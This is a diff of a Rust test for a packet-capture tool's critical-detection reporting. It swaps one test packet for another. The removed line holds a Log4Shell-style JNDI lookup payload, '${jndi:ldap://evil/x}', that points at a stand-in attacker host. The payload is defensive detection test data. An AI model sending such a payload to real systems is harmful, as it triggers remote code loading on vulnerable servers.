@@ -2,6 +2,8 @@
 mod http2;
 #[path = "support/http.rs"]
 mod support;
+#[path = "support/critical.rs"]
+mod critical;
 
 use packrat_tui::{export::pcapng::PcapNgWriter, net::packet::CaptureMetadata};
 use serde_json::Value;
@@ -126,7 +128,7 @@ fn critical_detection_is_reported_without_enforcement() {
     let path = directory.path().join("incident.pcapng");
     let mut writer = PcapNgWriter::create(&path).unwrap();
     writer
-        .write_packet(&support::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}", false))
+        .write_packet(&critical::invalid_neighbor_discovery_hop_limit(1))
         .unwrap();
     writer.flush().unwrap();
     let events = events(&run(&path));
